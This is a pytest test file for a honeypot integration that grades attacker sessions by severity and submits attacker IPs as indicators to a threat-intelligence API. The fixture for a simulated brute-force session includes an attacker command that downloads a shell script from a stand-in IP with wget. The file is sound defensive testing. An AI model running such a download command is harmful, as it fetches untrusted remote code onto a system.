import json

import pytest
import requests

import honeytrap_integration as integration


def test_severity_rises_with_download_commands():
    quiet = {
        "attempts": 2,
        "usernames": {"root"},
        "passwords": {"admin"},
        "commands": [],
    }
    noisy = {
        "attempts": 10,
        "usernames": {"root", "admin", "ubuntu", "pi", "git"},
        "passwords": {"a", "b", "c", "d", "e"},
        "commands": ["wget http://203.0.113.10/setup.sh"],
    }
    assert integration.calculate_severity(quiet) == "low"
    assert integration.calculate_severity(noisy) == "critical"


def test_submit_sends_api_key_header(monkeypatch: pytest.MonkeyPatch):
    captured: dict = {}

    class Response:
        status_code = 201

    def fake_post(url, **kwargs):
        captured["url"] = url
        captured["json"] = kwargs["json"]
        captured["headers"] = kwargs["headers"]
        captured["timeout"] = kwargs["timeout"]
        return Response()

    monkeypatch.setattr(requests, "post", fake_post)
    payload = {
        "value": "203.0.113.10",
        "severity": "high",
        "confidence": 70,
        "tags": ["honeypot", "ssh"],
    }
    assert integration.submit_indicator(
        "http://sentinelforge.example/api/v1",
        "test-key",
        payload,
        5.0,
    )
    assert captured["url"] == "http://sentinelforge.example/api/v1/indicators"
    assert captured["headers"]["X-API-Key"] == "test-key"
    assert captured["timeout"] == (3.0, 5.0)
    assert captured["json"]["value"] == "203.0.113.10"


def test_api_key_is_required(monkeypatch: pytest.MonkeyPatch):
    monkeypatch.delenv("SENTINELFORGE_API_KEY", raising=False)
    with pytest.raises(SystemExit):
        integration.api_settings(10.0)


def test_sample_events_become_indicators(tmp_path, monkeypatch: pytest.MonkeyPatch):
    sample = tmp_path / "events.jsonl"
    event = {
        "id": "11111111-1111-4111-8111-111111111111",
        "session_id": "22222222-2222-4222-8222-222222222222",
        "timestamp": "2026-03-14T08:15:02Z",
        "protocol": "ssh",
        "category": "command",
        "source": {"ip": "203.0.113.10", "port": 51234},
        "command": {"command": "uname -a"},
    }
    sample.write_text(json.dumps(event) + "\n", encoding="utf-8")

    class Response:
        status_code = 201

    monkeypatch.setattr(requests, "post", lambda *args, **kwargs: Response())
    tracker = integration.Tracker()
    submitted = integration.process_once(
        sample,
        tracker,
        "http://sentinelforge.example/api/v1",
        "test-key",
        5.0,
    )
    assert submitted == 1
    assert "203.0.113.10" in tracker.ip_stats
